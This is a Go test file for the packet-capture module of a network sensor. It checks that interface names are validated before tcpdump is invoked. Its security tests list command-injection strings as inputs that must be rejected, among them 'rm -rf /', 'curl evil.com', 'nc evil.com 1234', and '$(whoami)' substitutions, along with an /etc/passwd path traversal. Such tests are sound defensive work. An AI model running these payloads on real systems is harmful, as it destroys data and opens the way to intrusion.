//go:build linux || darwin

package linux

import (
	"context"
	"errors"
	"os/exec"
	"sync"
	"testing"
	"time"

	"EnigmaNetz/Enigma-Go-Sensor/internal/capture/common"
)

// mockCmd is a mock for exec.Cmd
var mockRunError error
var gotArgs []string
var allCapturedArgs [][]string // Track all command invocations for multi-interface tests
var argsMutex sync.Mutex       // Protect concurrent access to allCapturedArgs

// TestLinuxCapturer_Capture_Success verifies that the LinuxCapturer successfully captures data when the command executes without error.
func TestLinuxCapturer_Capture_Success(t *testing.T) {
	c := NewLinuxCapturer()
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	config := common.CaptureConfig{
		CaptureWindow:   1 * time.Second,
		CaptureInterval: 1 * time.Second,
		OutputDir:       "/tmp",
		Interface:       "eth0",
	}

	// Patch commandContext to return a dummy Cmd
	origCommandContext := commandContext
	commandContext = func(name string, arg ...string) *exec.Cmd {
		gotArgs = arg
		return exec.Command("echo")
	}
	defer func() { commandContext = origCommandContext }()

	_, err := c.Capture(ctx, config)
	if err != nil {
		t.Fatalf("Capture() error = %v", err)
	}
	found := false
	for i := range gotArgs {
		if gotArgs[i] == "eth0" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected interface arg 'eth0', got %v", gotArgs)
	}
}

// TestLinuxCapturer_Capture_Error verifies that the LinuxCapturer returns an error when the capture command fails to execute.
func TestLinuxCapturer_Capture_Error(t *testing.T) {
	c := NewLinuxCapturer()
	mockRunError = errors.New("mock error")
	origCommandContext := commandContext
	commandContext = func(name string, arg ...string) *exec.Cmd {
		cmd := exec.Command("false")
		return cmd
	}
	defer func() { commandContext = origCommandContext }()
	config := common.CaptureConfig{
		CaptureWindow:   1 * time.Second,
		CaptureInterval: 1 * time.Second,
		OutputDir:       "/tmp",
	}
	_, err := c.Capture(context.Background(), config)
	if err == nil {
		t.Errorf("Expected error, got nil")
	}
}

// TestLinuxCapturer_InterfaceSecurity tests command injection prevention
func TestLinuxCapturer_InterfaceSecurity(t *testing.T) {
	c := NewLinuxCapturer()

	// These are dangerous command injection patterns that must be blocked
	maliciousInputs := []struct {
		name  string
		input string
	}{
		{"command injection semicolon", "eth0; rm -rf /"},
		{"command injection ampersand", "eth0 && curl evil.com"},
		{"command injection pipe", "eth0|nc evil.com 1234"},
		{"command injection backtick", "eth0`whoami`"},
		{"command injection dollar", "eth0$(whoami)"},
		{"newline injection", "eth0\nwhoami"},
		{"path traversal", "../../../etc/passwd"},
		{"invalid characters", "eth0@test#$%"},
		{"spaces", "eth0 test"},
		{"quotes", "eth0\"test"},
	}

	// Mock commandContext to avoid actual tcpdump calls
	origCommandContext := commandContext
	commandContext = func(name string, arg ...string) *exec.Cmd {
		return exec.Command("echo")
	}
	defer func() { commandContext = origCommandContext }()

	for _, tt := range maliciousInputs {
		t.Run(tt.name, func(t *testing.T) {
			config := common.CaptureConfig{
				Interface:       tt.input,
				CaptureWindow:   time.Millisecond * 10, // Very short to fail fast
				CaptureInterval: time.Millisecond * 10,
				OutputDir:       "/tmp",
			}

			ctx, cancel := context.WithTimeout(context.Background(), time.Millisecond*50)
			defer cancel()

			_, err := c.Capture(ctx, config)

			// Must fail with interface parsing error, not reach command execution
			if err == nil {
				t.Fatalf("SECURITY FAILURE: Malicious input %q was not blocked!", tt.input)
			}

			// Should fail at interface validation, not command execution
			errMsg := err.Error()
			if !(containsString(errMsg, "invalid interface") || containsString(errMsg, "failed to parse interface")) {
				t.Errorf("Expected interface validation error for %q, got: %v", tt.input, err)
			}

			// The main security check is that the input was rejected at validation
			// Error messages may contain the input for debugging purposes, which is acceptable
			// as long as the dangerous input never reaches tcpdump command execution
		})
	}
}

// TestLinuxCapturer_ValidInterfaces tests that legitimate interfaces work
func TestLinuxCapturer_ValidInterfaces(t *testing.T) {
	c := NewLinuxCapturer()

	validInputs := []struct {
		name     string
		input    string
		expected string // First interface that should be extracted
	}{
		{"single interface", "eth0", "eth0"},
		{"interface with dash", "en0-1", "en0-1"},
		{"interface with underscore", "eth_0", "eth_0"},
		{"interface with dot", "eth0.100", "eth0.100"},
		{"any interface", "any", "any"},
		{"all interface", "all", "all"},
		{"comma separated", "eth0,wlan0", "eth0"},
		{"comma with spaces", "eth0, wlan0, en0", "eth0"},
		{"empty defaults to any", "", "any"},
		{"skip empty first", ",eth0,wlan0", "eth0"},
		{"whitespace handling", " eth0 ", "eth0"},
	}

	// Mock commandContext to avoid actual tcpdump calls
	origCommandContext := commandContext
	commandContext = func(name string, arg ...string) *exec.Cmd {
		// Store the interface argument for verification (thread-safe)
		argsMutex.Lock()
		gotArgs = arg
		allCapturedArgs = append(allCapturedArgs, append([]string(nil), arg...)) // Copy slice
		argsMutex.Unlock()
		return exec.Command("echo")
	}
	defer func() {
		commandContext = origCommandContext
		allCapturedArgs = nil // Reset for next test
	}()

	for _, tt := range validInputs {
		t.Run(tt.name, func(t *testing.T) {
			// Reset captured args for this test
			argsMutex.Lock()
			allCapturedArgs = nil
			argsMutex.Unlock()

			config := common.CaptureConfig{
				Interface:       tt.input,
				CaptureWindow:   time.Millisecond * 10,
				CaptureInterval: time.Millisecond * 10,
				OutputDir:       "/tmp",
			}

			ctx, cancel := context.WithTimeout(context.Background(), time.Millisecond*100)
			defer cancel()

			_, err := c.Capture(ctx, config)

			// Should not fail due to interface parsing
			if err != nil && (containsString(err.Error(), "invalid interface") || containsString(err.Error(), "failed to parse interface")) {
				t.Errorf("Valid interface %q should not cause parsing error: %v", tt.input, err)
			}

			// Verify the correct interface was passed to tcpdump
			if err == nil || !containsString(err.Error(), "invalid interface") {
				// For multi-interface capture, check that the expected interface appears in any of the command invocations
				argsMutex.Lock()
				capturedArgs := allCapturedArgs
				argsMutex.Unlock()

				foundExpected := false
				for _, args := range capturedArgs {
					// Find -i argument and check the interface
					for i, arg := range args {
						if arg == "-i" && i+1 < len(args) {
							actualInterface := args[i+1]
							if actualInterface == tt.expected {
								foundExpected = true
								break
							}
						}
					}
					if foundExpected {
						break
					}
				}

				if !foundExpected {
					t.Errorf("Expected interface %q to be passed to tcpdump, but it was not found in any command invocation", tt.expected)
				}
			}
		})
	}
}

// TestLinuxCapturer_CommaHandling tests edge cases in comma-separated interface parsing
func TestLinuxCapturer_CommaHandling(t *testing.T) {
	c := NewLinuxCapturer()

	// Mock commandContext to avoid actual tcpdump calls
	origCommandContext := commandContext
	commandContext = func(name string, arg ...string) *exec.Cmd {
		argsMutex.Lock()
		gotArgs = arg
		allCapturedArgs = append(allCapturedArgs, append([]string(nil), arg...))
		argsMutex.Unlock()
		return exec.Command("echo")
	}
	defer func() {
		commandContext = origCommandContext
		allCapturedArgs = nil
	}()

	edgeCases := []struct {
		name     string
		input    string
		expected string // What should be passed to tcpdump
		shouldOK bool
	}{
		{"empty segments before valid", ",,eth0", "eth0", true},
		{"all empty segments", ",,,", "any", true},              // Should default to "any"
		{"whitespace only segments", " , , ", "any", true},      // Should default to "any"
		{"mixed empty and valid", ",eth0,", "eth0", true},       // Should use "eth0"
		{"only commas", ",", "any", true},                       // Should default to "any"
		{"malicious after empty", ",eth0; rm -rf /", "", false}, // Should block malicious
	}

	for _, tt := range edgeCases {
		t.Run(tt.name, func(t *testing.T) {
			// Reset captured args for this test
			argsMutex.Lock()
			allCapturedArgs = nil
			argsMutex.Unlock()

			config := common.CaptureConfig{
				Interface:       tt.input,
				CaptureWindow:   time.Millisecond * 10,
				CaptureInterval: time.Millisecond * 10,
				OutputDir:       "/tmp",
			}

			ctx, cancel := context.WithTimeout(context.Background(), time.Millisecond*50)
			defer cancel()

			_, err := c.Capture(ctx, config)

			hasInterfaceError := err != nil && (containsString(err.Error(), "invalid interface") || containsString(err.Error(), "failed to parse interface"))

			if tt.shouldOK && hasInterfaceError {
				t.Errorf("Input %q should be valid but got interface error: %v", tt.input, err)
			}

			if !tt.shouldOK && !hasInterfaceError {
				t.Errorf("Input %q should be blocked but was accepted", tt.input)
			}

			// If it should work, verify the expected interface was passed
			if tt.shouldOK && !hasInterfaceError {
				// For multi-interface capture, check that the expected interface appears in any of the command invocations
				argsMutex.Lock()
				capturedArgs := allCapturedArgs
				argsMutex.Unlock()

				foundExpected := false
				for _, args := range capturedArgs {
					// Find -i argument and check the interface
					for i, arg := range args {
						if arg == "-i" && i+1 < len(args) {
							actualInterface := args[i+1]
							if actualInterface == tt.expected {
								foundExpected = true
								break
							}
						}
					}
					if foundExpected {
						break
					}
				}

				if !foundExpected {
					t.Errorf("Expected interface %q to be passed to tcpdump, but it was not found in any command invocation", tt.expected)
				}
			}
		})
	}
}

// Helper function to check if a string contains a substring
func containsString(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
